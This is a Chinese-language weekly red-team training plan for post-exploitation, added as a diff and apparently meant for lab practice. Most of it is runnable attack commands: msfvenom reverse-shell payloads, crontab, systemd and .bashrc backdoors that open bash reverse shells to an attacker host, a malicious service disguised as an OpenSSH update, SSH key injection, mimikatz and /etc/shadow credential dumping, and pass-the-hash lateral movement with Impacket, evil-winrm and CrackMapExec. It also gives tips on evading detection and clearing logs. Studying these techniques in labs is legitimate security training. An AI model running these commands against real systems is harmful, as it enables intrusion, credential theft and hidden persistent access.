@@ -1,0 +1,463 @@
+================================================================================
+第24周：后渗透实战 (后渗透期)
+================================================================================
+
+【本周围绕的核心渗透案例阶段】
+引用红队队员完整学习手册中的案例：
+后渗透与持久化阶段——攻击者成功完成提权后，需要在目标系统上
+建立长期的控制通道，收集内网情报，准备横向移动。这包括使用
+Meterpreter高级功能、在Linux/Windows上建立持久化后门、
+系统化地收集内网信息，以及完成横向移动的初步尝试。
+
+【本周学习目标】
+1. 掌握Meterpreter高级后渗透功能（文件系统、网络、进程操控）
+2. 熟练掌握Linux后渗透与持久化技术（SSH密钥、Crontab、Systemd Service）
+3. 掌握Windows后渗透与持久化技术（注册表Run键、计划任务、WMI事件订阅）
+4. 系统化地掌握内网信息收集方法论（域、网络拓扑、凭据、关键服务）
+5. 理解横向移动的基本概念和常用技术
+6. 能够完成从初始Shell → 提权 → 信息收集 → 持久化 → 横向移动的完整流程
+
+【本周知识清单】
+- Meterpreter后渗透模块全景：kiwi, hashdump, getsystem, migrate, load
+- Meterpreter文件系统操作：download, upload, search, cat, edit
+- Meterpreter网络模块：portfwd, route, arp_scanner
+- Meterpreter进程操控：ps, migrate, execute, getpid, steal_token
+- Linux持久化技术：
+  - SSH密钥注入：authorized_keys添加公钥
+  - Crontab后门：*/5 * * * * /tmp/backdoor.sh
+  - Systemd Service后门：创建恶意service unit文件
+  - .bashrc/.profile 后门
+  - PAM后门（高级）
+- Windows持久化技术：
+  - 注册表Run/RunOnce键
+  - 计划任务(Scheduled Tasks)
+  - WMI事件订阅(Event Consumer)
+  - DLL劫持持久化
+- 内网信息收集：
+  - 域信息：net group "Domain Admins" /domain, nltest, BloodHound
+  - 网络拓扑：arp -a, route print, netstat -ano（寻找关键服务）
+  - 共享文件夹：net view, net share
+  - 数据库/文件服务器/邮件服务器发现
+- 横向移动基础：PsExec, WMI, WinRM, SMB, RDP, SSH
+
+【本周工具清单】
+- Metasploit Framework (meterpreter) — 后渗透核心平台
+- mimikatz / kiwi (meterpreter extension) — 凭证提取
+- BloodHound (SharpHound采集器) — 域关系分析
+- Impacket工具套件 (PsExec, wmiexec, smbexec, secretsdump)
+- SSH客户端 (ssh-keygen, ssh, ssh-copy-id)
+- netcat / socat — 网络连接工具
+- CrackMapExec (CME) — SMB枚举与横向移动
+- PowerShell Empire / Covenant (了解概念) — C2框架
+- ProxyChains (已学) — 通过跳板访问内网
+- enum4linux — Linux SMB/RPC枚举
+
+================================================================================
+周一：Meterpreter高级后渗透
+================================================================================
+
+📚 第1小时 | 理论学习 (09:00 - 10:00)
+  学习内容：Meterpreter高级功能详解
+    - Meterpreter架构：Stager → Stage → Meterpreter Core → Extensions
+    - Meterpreter命令分类：
+      - 核心命令：sysinfo, getuid, getpid, shell, background, migrate
+      - 文件系统命令：pwd, cd, ls, cat, download, upload, edit, mkdir, rm
+      - 网络命令：ipconfig, route, netstat, portfwd, arp_scanner
+      - 系统命令：ps, execute, getprivs, getsystem, kill, reboot
+      - 用户接口：screenshot, keylog_start, idletime
+    - Meterpreter扩展：
+      - kiwi (mimikatz集成): creds_all, lsa_dump_sam, kiwi_cmd
+      - incognito: list_tokens, impersonate_token
+      - extapi: clipboard, adsi, window_enum
+    - Meterpreter pivoting：
+      - route add 子网 网段 Session_ID
+      - portfwd add -L 本地 -R 远程
+      - socks_proxy 模块
+    - Meterpreter vs 传统Shell的优势：
+      内存驻留、流量加密、不创建新进程、模块化扩展
+  参考文件：/home/a/成长为一个红队/archstrike-base教学/07-后渗透与权限维持.txt
+
+💻 第2小时 | 动手实践 (10:00 - 11:00)
+  练习内容：Meterpreter高级功能实战
+  参考文件：/home/a/成长为一个红队/archstrike-base教学/07-后渗透与权限维持.txt
+
+  操作步骤：
+    Step 1: 获取Meterpreter Session
+      使用msfvenom生成载荷:
+        msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f elf -o meterp.elf
+      目标执行meterp.elf获得session
+      msfconsole中: use exploit/multi/handler, set payload linux/x64/meterpreter/reverse_tcp
+      set LHOST IP, set LPORT 4444, run
+    Step 2: 基础信息收集
+      sysinfo → 系统信息
+      getuid → 当前用户
+      ipconfig → 网络信息
+      route → 路由表
+      ps → 进程列表
+    Step 3: 文件系统操作练习
+      pwd → 当前目录
+      ls /etc/ → 列出目录
+      download /etc/passwd → 下载敏感文件
+      upload /tmp/tool.sh /tmp/tool.sh → 上传工具
+      search -f *.txt → 搜索文件
+    Step 4: Meterpreter端口转发
+      portfwd add -L 0.0.0.0 -l 3389 -p 3389 -r 10.0.0.50
+      这使攻击机的3389端口转发到内网Windows的3389
+      portfwd list → 查看转发列表
+      portfwd delete -l 3389 → 删除转发
+    Step 5: Meterpreter路由设置
+      run autoroute -s 10.0.1.0/24 → 向10.0.1.0/24网段添加路由
+      run autoroute -p → 打印路由表
+      background session，使用auxiliary/server/socks_proxy模块
+    Step 6: 加载kiwi模块凭证提取
+      load kiwi → 加载kiwi(mimikatz)扩展
+      creds_all → 获取所有凭据
+      lsa_dump_sam → 转储SAM
+      kiwi_cmd "sekurlsa::logonpasswords" → 执行原生mimikatz命令
+
+📝 第3小时 | 复盘总结 (11:00 - 12:00)
+  - 今日收获：掌握Meterpreter核心功能，理解模块化架构
+  - 遇到问题：____________________
+  - 明日计划：学习Linux后渗透与持久化技术
+
+================================================================================
+周二：Linux后渗透与持久化
+================================================================================
+
+📚 第1小时 | 理论学习 (09:00 - 10:00)
+  学习内容：Linux后渗透与持久化技术原理
+    - SSH密钥持久化：最隐蔽、最常用的Linux后门
+      - authorized_keys文件位置：~/.ssh/authorized_keys
+      - ssh-keygen -t rsa -b 4096 生成密钥对
+      - 将公钥注入目标的authorized_keys
+      - 权限要求：~/.ssh/目录700，authorized_keys文件600
+    - Crontab后门：
+      - 用户级：crontab -e 编辑当前用户定时任务
+      - 系统级：/etc/crontab, /etc/cron.d/, /etc/cron.*/
+      - 注意清理日志：/var/log/cron, /var/log/syslog
+    - Systemd Service持久化：
+      - 创建.service文件：/etc/systemd/system/malicious.service
+      - systemctl daemon-reload; systemctl enable malicious; systemctl start malicious
+      - 可伪装成常见服务名（如rsyslog, dbus-org）
+    - .bashrc / .profile 后门：
+      - 在~/.bashrc末尾添加反弹shell命令
+      - 局限性：只在用户交互登录时触发
+    - 高级持久化：PAM后门、Rootkit(LKM)、预加载库
+    - 后门防御/隐蔽性考虑：
+      - 检查系统管理员检测后门的常用手段
+      - 进程隐藏、流量伪装
+  参考文件：/home/a/成长为一个红队/archstrike-base教学/07-后渗透与权限维持.txt
+
+💻 第2小时 | 动手实践 (10:00 - 11:00)
+  练习内容：Linux后渗透与持久化实战
+  参考文件：/home/a/成长为一个红队/archstrike-base教学/07-后渗透与权限维持.txt
+
+  操作步骤：
+    Step 1: SSH密钥持久化
+      攻击机生成密钥: ssh-keygen -t rsa -b 4096 -f backdoor_key -N "" -C ""
+      查看公钥: cat backdoor_key.pub
+      在目标上注入公钥:
+        取得root后: mkdir -p /root/.ssh/
+        echo "公钥内容" >> /root/.ssh/authorized_keys
+        chmod 700 /root/.ssh/
+        chmod 600 /root/.ssh/authorized_keys
+      验证: ssh -i backdoor_key root@目标IP → 无密码登录
+    Step 2: Crontab后门
+      取得root后在目标上执行:
+        echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.100/5555 0>&1'" >> /var/spool/cron/crontabs/root
+        或:
+        echo "*/5 * * * * root /tmp/backdoor.sh" >> /etc/crontab
+      创建backdoor.sh:
+        #!/bin/bash
+        bash -i >& /dev/tcp/192.168.1.100/5555 0>&1
+      chmod +x /tmp/backdoor.sh
+      攻击机监听: nc -lvnp 5555
+      等待5分钟内Cron触发
+    Step 3: Systemd Service持久化
+      创建service文件:
+        cat > /etc/systemd/system/ssh-update.service << 'EOF'
+        [Unit]
+        Description=OpenSSH Daemon Update
+        After=network.target
+        [Service]
+        ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.100/6666 0>&1'
+        Restart=always
+        RestartSec=60
+        [Install]
+        WantedBy=multi-user.target
+        EOF
+      systemctl daemon-reload
+      systemctl enable ssh-update.service
+      systemctl start ssh-update.service
+      攻击机监听: nc -lvnp 6666
+    Step 4: .bashrc后门
+      在目标root/.bashrc末尾添加:
+        echo 'bash -i >& /dev/tcp/192.168.1.100/7777 0>&1 2>/dev/null &' >> /root/.bashrc
+      当管理员SSH登录时自动触发
+    Step 5: 验证所有持久化方法
+      重启目标机器: reboot
+      等待系统恢复后逐一验证每个后门是否仍然有效
+      记录哪种方法在什么情况下失效
+    Step 6: 清理测试环境（理解防御视角）
+      检查系统哪些日志会记录持久化操作:
+        cat /var/log/auth.log | grep authorized_keys
+        cat /var/log/syslog | grep cron
+        systemctl list-units --type=service --state=running | grep -i ssh-update
+
+📝 第3小时 | 复盘总结 (11:00 - 12:00)
+  - 今日收获：掌握Linux三种持久化方法，理解SSH密钥认证原理
+  - 遇到问题：____________________
+  - 明日计划：学习Windows持久化技术与内网信息收集
+
+================================================================================
+周三：内网信息收集
+================================================================================
+
+📚 第1小时 | 理论学习 (09:00 - 10:00)
+  学习内容：内网信息收集方法论
+    - 内网信息收集的三个层级：
+      层级1: 主机级 — 当前计算机的本地信息
+      层级2: 网络级 — 同一网段的邻居发现
+      层级3: 域级 — Active Directory域信息枚举
+    - 主机级信息收集回顾：
+      - whoami /all, systeminfo, ipconfig /all
+      - 本地凭据：SAM, LSA Secrets, LSASS, 浏览器保存密码
+      - 本地文件搜索：敏感文件(.kdbx, .rdp, .txt, .docx)
+    - 网络级信息收集：
+      - arp -a → ARP缓存表
+      - netstat -ano → 网络连接
+      - ping sweep / nmap ping扫描 → 存活主机
+      - net view (Windows) → 网络共享
+      - showmount -e (Linux NFS) → NFS导出
+    - 域级信息收集：
+      - net user /domain, net group /domain, net group "Domain Admins" /domain
+      - nltest /dclist:<域名> → 域控列表
+      - nltest /domain_trusts → 域信任关系
+      - BloodHound/SharpHound — 域关系图分析
+      - Get-NetUser, Get-NetGroup, Get-NetComputer (PowerView)
+    - 关键服务发现：DNS、DHCP、文件服务器、数据库、Web、邮件
+  参考文件：/home/a/成长为一个红队/archstrike-base教学/07-后渗透与权限维持.txt
+
+💻 第2小时 | 动手实践 (10:00 - 11:00)
+  练习内容：内网信息收集全流程
+  参考文件：/home/a/成长为一个红队/archstrike-base教学/07-后渗透与权限维持.txt
+
+  操作步骤：
+    Step 1: 主机级敏感信息收集
+      查找存储的凭据:
+        cmdkey /list (Windows)
+        cat ~/.bash_history (Linux)
+        find / -name "*password*" -o -name "*credential*" 2>/dev/null
+        find / -name "*.kdbx" -o -name "*.rdp" -o -name "*.ovpn" 2>/dev/null
+    Step 2: 网络邻居发现
+      Windows: net view /all
+               arp -a
+               ping 网段广播地址
+      Linux: arp -a
+             ip neigh
+             for i in {1..254}; do ping -c 1 -W 1 10.0.1.$i & done; wait
+             more /etc/hosts
+    Step 3: 利用nmap扫描内网（通过代理）
+      proxychains nmap -sT -Pn 10.0.1.0/24 (前提: 已搭建代理)
+      或通过Meterpreter: run autoroute -s 10.0.1.0/24
+        run post/multi/gather/ping_sweep RHOSTS=10.0.1.0/24
+    Step 4: 域环境信息收集（如有域环境）
+      net user /domain → 列出域用户
+      net group /domain → 列出域组
+      net group "Domain Admins" /domain → 域管理员
+      net group "Domain Controllers" /domain → 域控制器
+      nltest /dclist:<域名> → DC列表
+      net time /domain → 当前登录DC
+    Step 5: 使用BloodHound分析域关系
+      上传SharpHound.exe到目标
+      SharpHound.exe -c All → 收集域信息
+      下载生成的ZIP文件
+      攻击机: neo4j start, bloodhound
+      导入ZIP文件，分析域攻击路径
+      重点关注: 到Domain Admins的最短路径
+    Step 6: 服务发现与关键目标锁定
+      使用CrackMapExec: proxychains crackmapexec smb 10.0.1.0/24
+      识别SMB/Web/数据库/邮件等服务
+      标记高价值目标: DC, 文件服务器, 数据库服务器
+
+📝 第3小时 | 复盘总结 (11:00 - 12:00)
+  - 今日收获：掌握内网信息收集三层级方法论，初步了解BloodHound
+  - 遇到问题：____________________
+  - 明日计划：学习Windows后渗透与持久化，为横向移动做准备
+
+================================================================================
+周四：横向移动基础
+================================================================================
+
+📚 第1小时 | 理论学习 (09:00 - 10:00)
+  学习内容：横向移动基础技术
+    - 横向移动定义：从已攻陷主机向同一网络内其他主机扩展控制
+    - 常见横向移动协议与技术：
+      - SMB: PsExec, smbexec, wmiexec (Impacket)
+      - WMI: wmic, wmiexec.py, Invoke-WmiCommand
+      - WinRM: winrs, evil-winrm
+      - RDP: rdesktop, xfreerdp
+      - SSH: ssh, sshpass (密码认证)
+      - PSRemoting: Enter-PSSession, Invoke-Command
+      - DCOM: MMC20.Application, ShellWindows, ShellBrowserWindow
+      - Schtasks: 远程计划任务执行
+    - Pass-the-Hash (PtH) 攻击原理：
+      - NTLM认证机制: challenge-response
+      - PtH = 使用NTLM Hash代替明文密码进行认证
+      - 应用场景：拿到Administrator的Hash后横向到其他机器
+    - Pass-the-Ticket (PtT) 攻击：
+      - Kerberos Ticket（TGT/TGS）重用
+    - 横向移动的前提条件：
+      - 需要有效的凭据（明文密码/NTLM Hash/Kerberos Ticket）
+      - 目标端口可达（445, 135, 5985, 5986, 3389等）
+      - 不需要绕过AV/EDR的考虑
+    - 横向移动工具对比
+  参考文件：/home/a/成长为一个红队/archstrike-base教学/07-后渗透与权限维持.txt
+
+💻 第2小时 | 动手实践 (10:00 - 11:00)
+  练习内容：横向移动工具实战
+  参考文件：/home/a/成长为一个红队/archstrike-base教学/07-后渗透与权限维持.txt
+
+  操作步骤：
+    Step 1: 获取凭据（以进行横向移动）
+      在当前已攻陷主机上提取凭据:
+        mimikatz: sekurlsa::logonpasswords
+        或 reg save + secretsdump.py
+      记录获取到的用户名、密码、Hash
+    Step 2: Impacket wmiexec横向移动
+      使用NTLM Hash:
+        impacket-wmiexec -hashes :<NTLM_HASH> domain/user@target_IP
+      使用明文密码:
+        impacket-wmiexec domain/user:password@target_IP
+      成功则获得目标主机的交互式Shell
+    Step 3: Impacket psexec横向移动
+      impacket-psexec domain/user:password@target_IP
+      impacket-psexec -hashes :<NTLM_HASH> domain/user@target_IP
+      注意: PsExec会写入服务二进制到目标，可能被AV拦截
+    Step 4: Impacket smbexec横向移动
+      impacket-smbexec domain/user:password@target_IP
+      smbexec通过SMB创建服务来执行命令
+    Step 5: evil-winrm横向移动
+      若目标开放WinRM(5985/5986):
+        evil-winrm -i target_IP -u user -p password
+        evil-winrm -i target_IP -u user -H <NTLM_HASH>
+      注意: WinRM需要用户在Remote Management Users组中
+    Step 6: CrackMapExec横行批量检查
+      crackmapexec smb 10.0.1.0/24 -u user -p password
+      或使用Hash: crackmapexec smb 10.0.1.0/24 -u user -H <HASH>
+      --local-auth 参数用于本地账户认证
+      检查输出中标记为(Pwn3d!)的成功主机
+
+📝 第3小时 | 复盘总结 (11:00 - 12:00)
+  - 今日收获：掌握Impacket和CME进行基本横向移动的方法
+  - 遇到问题：____________________
+  - 明日计划：完成从Shell到后渗透的全流程实战演练
+
+================================================================================
+周五：完整后渗透流程模拟
+================================================================================
+
+📚 第1小时 | 理论学习 (09:00 - 10:00)
+  学习内容：标准化后渗透流程
+    - 完整后渗透流程框架：
+      Phase 1: 初始立足点 (Shell / Meterpreter)
+      Phase 2: 提权 (LinPEAS/WinPEAS → 提权 → SYSTEM/root)
+      Phase 3: 信息收集 (主机 → 网络 → 域)
+      Phase 4: 凭据获取 (SAM/LSASS/Kerberos Tickets)
+      Phase 5: 持久化 (SSH密钥/计划任务/服务)
+      Phase 6: 横向移动 (PsExec/WMI/WinRM/SSH)
+      Phase 7: 数据收集与输出
+    - 每个阶段的工具选择矩阵
+    - 实战中需要临场决策的判断点
+    - 后渗透操作的安全性考量：
+      - 避免触发警报（EDR/SIEM规避基础）
+      - 最小化操作痕迹
+      - 非必要不修改系统（避免破坏稳定性）
+    - 制定个人后渗透操作checklist
+  参考文件：/home/a/成长为一个红队/archstrike-base教学/07-后渗透与权限维持.txt
+
+💻 第2小时 | 动手实践 (10:00 - 11:00)
+  练习内容：完整后渗透流程实战演练
+  参考文件：/home/a/成长为一个红队/archstrike-base教学/07-后渗透与权限维持.txt
+
+  操作步骤：
+    Step 1: 获得初始Shell
+      使用DVWA/文件上传等漏洞获得低权限Shell
+      确认: whoami, id (低权限用户)
+    Step 2: 提权至root/SYSTEM
+      Linux: ./linpeas.sh → 发现SUID程序 → 利用 → root
+      Windows: winPEASx64.exe → Token提权 → SYSTEM
+      验证: whoami (确认root/SYSTEM)
+    Step 3: 信息收集
+      Linux: ls -la /home/, find / -name "*.conf" 2>/dev/null, arp -a
+      Windows: net view, arp -a, netstat -ano, ipconfig /all
+      记录所有收集到的内网信息
+    Step 4: 凭据提取
+      Linux: cat /etc/shadow, cat ~/.bash_history
+      Windows: mimikatz → sekurlsa::logonpasswords
+      创建凭据清单（用户名、Hash、发现位置）
+    Step 5: 持久化建立
+      Linux: SSH密钥注入 + Crontab后门
+      Windows: 注册表Run键 + 计划任务
+      验证: 断开连接后重新登录测试持久化是否成功
+    Step 6: 横向移动尝试
+      使用获取的凭据尝试横向移动
+      crackmapexec smb 内网段 -u user -H hash
+      若成功: 重复Phase 1-5在新目标上
+
+📝 第3小时 | 复盘总结 (11:00 - 12:00)
+  - 今日收获：完成完整后渗透链，建立标准化操作流程
+  - 遇到问题：____________________
+  - 明日计划：复习本周全部内容，整理后渗透操作手册
+
+================================================================================
+周六：复习日 (2h 复习 + 1h HTB/THM)
+================================================================================
+
+📚 复习内容（2小时）
+  1. 整理完整后渗透流程checklist（从Shell到持久化的标准操作）
+  2. 对比Meterpreter和原生Shell在后渗透中的优劣势
+  3. 整理Linux持久化技术速查表（SSH/Cron/Systemd/bashrc）
+  4. 整理Windows持久化技术速查表（Run键/计划任务/WMI/服务）
+  5. 复习Impacket工具套件各工具的使用场景
+  6. 阅读BloodHound域的Attack Path分析
+
+💻 HTB/THM练习（1小时）
+  - 登录HackTheBox平台
+  - 选择一个需要内网后渗透的场景（推荐: Active, Forest, Sauna）
+  - 重点练习: 凭据提取 → BloodHound分析 → 横向移动
+  - 目标: 完成从初始Shell到Domain Admin的完整链
+
+📝 复习笔记
+  - 本周最有效的技术：____________________
+  - 需要加强的部分：____________________
+  - 下周预习计划：痕迹清除与渗透测试报告写作
+
+================================================================================
+周日：休息日
+================================================================================
+
+【本周资源清单】
+理论知识文件：
+  /home/a/成长为一个红队/archstrike-base教学/07-后渗透与权限维持.txt
+  /home/a/成长为一个红队/网安基础知识/XX-后渗透框架.txt
+
+实践教程文件：
+  /home/a/成长为一个红队/archstrike-base教学/07-后渗透与权限维持.txt
+  /home/a/成长为一个红队/archstrike-privilege-escalation教学/01-Linux权限提升完整指南.txt (提权部分)
+  /home/a/成长为一个红队/archstrike-privilege-escalation教学/02-Windows权限提升技术.txt (提权部分)
+
+在线练习：
+  HackTheBox: Active, Forest, Sauna, Cascade, Monteverde (域渗透相关)
+  TryHackMe: Active Directory Basics, Post-Exploitation Basics, Lateral Movement
+
+工具下载：
+  Impacket: https://github.com/SecureAuthCorp/impacket
+  BloodHound: https://github.com/BloodHoundAD/BloodHound
+  CrackMapExec: https://github.com/byt3bl33d3r/CrackMapExec
+  evil-winrm: https://github.com/Hackplayers/evil-winrm
+  Metasploit: 发行版包管理器安装
+
+【本周完成检查】
+[ ] 周一 [ ] 周二 [ ] 周三 [ ] 周四 [ ] 周五
+[ ] 周六复习 [ ] 笔记 [ ] 体能
